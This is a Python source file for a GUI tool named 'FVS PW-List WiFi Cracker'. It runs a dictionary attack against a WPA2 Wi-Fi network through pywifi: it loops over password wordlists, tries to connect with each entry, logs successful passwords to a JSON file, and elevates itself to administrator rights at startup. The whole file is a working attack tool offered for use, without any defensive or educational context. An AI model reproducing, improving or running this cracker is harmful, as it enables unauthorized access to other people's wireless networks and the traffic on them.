import time
import random
import json
import tkinter as tk
import ctypes
import sys
import glob
import string
from pywifi import const, PyWiFi, Profile
from tkinter import filedialog

# Initialize tried_passwords.json if it doesn't exist
try:
    with open('tried_passwords.json', 'r') as file:
        tried_passwords = json.load(file)
except FileNotFoundError:
    tried_passwords = {}

password_file_path = 'tried_passwords.json'
previous_attempts_cache = set()
previous_ssid = ''
should_continue = True


def load_settings():
    try:
        with open('settings.json', 'r') as file:
            settings = json.load(file)
            return settings
    except FileNotFoundError:
        return {}


loaded_settings = load_settings()
specific_password = loaded_settings.get('specific_password', '')
restart_count = loaded_settings.get('restart_count', 0)

root = tk.Tk()
root.title("FVS PW-List WiFi Cracker")
root.configure(bg="black")

attempts_label = tk.Label(root, text="Attempts: 0", fg="green", bg="black")
attempts_label.pack()

# Welcome banner
welcome_banner = tk.Label(root, text="Welcome to FVS\nPW-List WiFi Cracker", fg="green", bg="black",
                          font=("Helvetica", 16))
welcome_banner.pack()

# Success banner (initially empty and hidden)
success_banner = tk.Label(root, text="", fg="red", bg="black", font=("Helvetica", 16))
success_banner.pack()


def display_success_banner():
    success_banner.config(text="LOGGED IN!")
    root.after(7000, lambda: success_banner.config(text=f'CONNECTION SUCCESSFUL!'))


def save_settings():
    settings = {
        'ssid': ssid_entry.get(),
        'specific_password': specific_password_entry.get()  # Save the specific password
    }
    with open('settings.json', 'w') as file:
        json.dump(settings, file)


def auto_click_connect():
    start_button.invoke()


if "--auto-connect" in sys.argv:
    root.after(1000, auto_click_connect)

settings = load_settings()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)


def select_password_file():
    global password_file_path
    file_path = filedialog.askopenfilename(filetypes=[("JSON files", "*.json")])
    if file_path:
        password_file_path = file_path
        output_text.insert(tk.END, f"Selected password file: {password_file_path}\n")
        output_text.see(tk.END)


def test_specific_password():
    ssid_input = ssid_entry.get()
    specific_password = specific_password_entry.get()
    if connect_to_wifi(ssid_input, specific_password, output_text):
        output_text.insert(tk.END, f"Successfully connected using specific password: {specific_password}\n")
        output_text.see(tk.END)

    else:
        output_text.insert(tk.END, f"Failed to connect using specific password: {specific_password}\n")
        output_text.see(tk.END)


def stop_connection():
    global should_continue
    should_continue = False
    save_settings()
    output_text.insert(tk.END, "Stopped connection attempts!\n")
    output_text.see(tk.END)


def generate_random_string(all_length, letters_length, numbers_length, special_characters_length):
    letters = string.ascii_letters
    numbers = string.digits
    special_characters = "!@#$%^&*()_-+=<>?"
    generated_letters = ''.join([random.choice(letters) for _ in range(letters_length)])
    generated_numbers = ''.join([random.choice(numbers) for _ in range(numbers_length)])
    generated_special_characters = ''.join(
        [random.choice(special_characters) for _ in range(special_characters_length)])
    random_string = generated_letters + generated_numbers + generated_special_characters
    remaining_length = all_length - len(random_string)
    all_characters = letters + numbers + special_characters
    random_string += ''.join([random.choice(all_characters) for _ in range(remaining_length)])
    random_string = ''.join(random.sample(random_string, len(random_string)))

    return random_string


def connect_to_wifi(ssid, password, output_text):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    # Remove the specific profile of the SSID you want to connect to (if it exists)
    for p in iface.network_profiles():
        if p.ssid == ssid:
            iface.remove_network_profile(p)

    # Add the new profile
    profile = iface.add_network_profile(profile)
    iface.connect(profile)

    for _ in range(1):
        time.sleep(0.7)
        if iface.status() == const.IFACE_CONNECTED:
            output_text.insert(tk.END, f"Connected to {ssid} successfully!\nSSID: {ssid}\nPassword: {password}\n")
            output_text.see(tk.END)

            # Flash success banner
            display_success_banner()

            # Save tried password to JSON
            if ssid not in tried_passwords:
                tried_passwords[ssid] = []  # Initialize as an empty list
            tried_passwords[ssid].append(password)
            with open('tried_passwords.json', 'w') as file:
                json.dump(tried_passwords, file, indent=4)

            return True

    return False


def load_passwords_from_folder():
    passwords = []
    folder_path = 'lists/*.json'
    for filename in glob.glob(folder_path):
        with open(filename, 'r') as file:
            file_content = file.read()
            try:
                password_list = json.loads(file_content)
                if isinstance(password_list, list):
                    passwords += password_list
            except json.JSONDecodeError:
                # Handle case where the content is not a valid JSON array
                json_objects = file_content.split('][')
                for json_object in json_objects:
                    if not json_object.startswith('['):
                        json_object = '[' + json_object
                    if not json_object.endswith(']'):
                        json_object += ']'
                    try:
                        password_list = json.loads(json_object)
                        if isinstance(password_list, list):
                            passwords += password_list
                    except json.JSONDecodeError:
                        print(f"Skipping invalid content: {json_object}")
    return passwords


# New function to load common passwords
def load_common_passwords():
    common_passwords_path = 'lists/common_pass.json'
    try:
        with open(common_passwords_path, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return []


def try_to_connect():
    global should_continue
    ssid_input = ssid_entry.get()

    # Load other passwords first
    passwords_to_try = load_passwords_from_folder()

    # Load common passwords if the checkbox is selected
    if use_common_pass_var.get() == 1:
        passwords_to_try = load_common_passwords() + passwords_to_try

    # Counter to keep track of attempts
    attempts = 0

    # Iterate through the passwords and try to connect
    for password_dict in passwords_to_try:
        if not should_continue:
            break

        password = password_dict['password']  # Extract the password string from the dictionary

        attempts += 1  # Increment the attempt counter
        attempts_label.config(text=f"Attempts: {attempts}")  # Update the attempts label

        if connect_to_wifi(ssid_input, password, output_text):
            output_text.insert(tk.END, f"Connected successfully after {attempts} attempts!\n")
            output_text.see(tk.END)
            break
        else:
            output_text.insert(tk.END, f"{password} ")  # Display only the password string
            output_text.see(tk.END)

            root.update()


def create_label(text):
    return tk.Label(root, text=text, fg="green", bg="black")


def create_entry():
    return tk.Entry(root, fg="green", bg="black")


output_text = tk.Text(root, height=10, width=50, wrap=tk.WORD, fg="green", bg="black")
output_text.pack()

ssid_label = create_label("SSID:")
ssid_label.pack()
ssid_entry = create_entry()
ssid_entry.insert(0, settings.get('ssid', ''))
ssid_entry.pack()

specific_password_label = create_label("Specific Password:")
specific_password_label.pack()
specific_password_entry = create_entry()
specific_password_entry.insert(0, specific_password)  # Set the specific password
specific_password_entry.pack()

use_common_pass_var = tk.IntVar(value=1)  # Default checked
use_common_pass_checkbutton = tk.Checkbutton(root, text="Use common passwords first", variable=use_common_pass_var,
                                             fg="green", bg="black")
use_common_pass_checkbutton.pack()

start_button = tk.Button(root, text="Start Connection", fg="green", bg="black", command=try_to_connect)
start_button.pack()

stop_button = tk.Button(root, text="Stop Connection", fg="green", bg="black", command=stop_connection)
stop_button.pack()

test_specific_password_button = tk.Button(root, text="Test Specific Password", fg="green", bg="black",
                                          command=test_specific_password)
test_specific_password_button.pack()


def exit_app():
    save_settings()
    root.quit()


exit_button = tk.Button(root, text="Exit", fg="red", bg="black", command=exit_app)
exit_button.pack()

root.mainloop()
